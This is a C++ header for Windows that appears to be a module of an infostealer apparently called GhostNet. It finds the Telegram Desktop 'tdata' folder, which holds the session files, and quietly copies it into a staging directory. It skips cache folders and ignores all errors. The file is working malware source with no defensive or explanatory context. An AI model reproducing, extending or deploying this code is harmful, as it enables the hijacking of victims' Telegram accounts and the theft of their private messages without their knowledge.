#ifndef TELEGRAM_HPP
#define TELEGRAM_HPP

#include <string>
#include <vector>
#include <filesystem>
#include <cstdlib>
#include <windows.h>
#include <algorithm>

namespace fs = std::filesystem;

namespace Telegram {

    inline void CopyDirectoryExcluding(const std::string& srcDir, const std::string& dstDir, const std::vector<std::string>& excludeDirs) {
        try {
            for (const auto& entry : fs::recursive_directory_iterator(srcDir, fs::directory_options::skip_permission_denied)) {
                std::string relativePath = fs::relative(entry.path(), srcDir).string();
                std::replace(relativePath.begin(), relativePath.end(), '/', '\\');

                // Check if this path should be excluded
                bool shouldSkip = false;
                for (const auto& exclude : excludeDirs) {
                    if (relativePath.find(exclude) == 0) {
                        shouldSkip = true;
                        break;
                    }
                }

                if (shouldSkip) continue;

                std::string destinationPath = dstDir + "\\" + relativePath;

                if (fs::is_directory(entry)) {
                    CreateDirectoryA(destinationPath.c_str(), NULL);
                }
                else {
                    CopyFileA(entry.path().string().c_str(), destinationPath.c_str(), FALSE);
                }
            }
        }
        catch (const std::exception& e) {
            // Silently handle errors
        }
    }

    inline void ExtractTelegramData(const std::string& ghostNetPath) {
        // Get user profile path
        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) return;

        std::string telegramDataPath = std::string(userProfile) + "\\AppData\\Roaming\\Telegram Desktop\\tdata";

        // Check if Telegram is installed
        if (!fs::exists(telegramDataPath)) return;

        // Create Telegram folder in GhostNet directory
        std::string telegramOutputPath = ghostNetPath + "\\Telegram";
        CreateDirectoryA(telegramOutputPath.c_str(), NULL);

        // List of folders to exclude (unnecessary data)
        std::vector<std::string> excludedFolders = {
            "user_data",
            "emoji",
            "tdummy",
            "user_data#2",
            "user_data#3",
            "user_data#4",
            "user_data#5",
            "user_data#6",
            "webview",
            "dumps",
            "temp"
        };

        // Copy Telegram data excluding unnecessary folders
        CopyDirectoryExcluding(telegramDataPath, telegramOutputPath, excludedFolders);
    }
}

#endif // TELEGRAM_HPP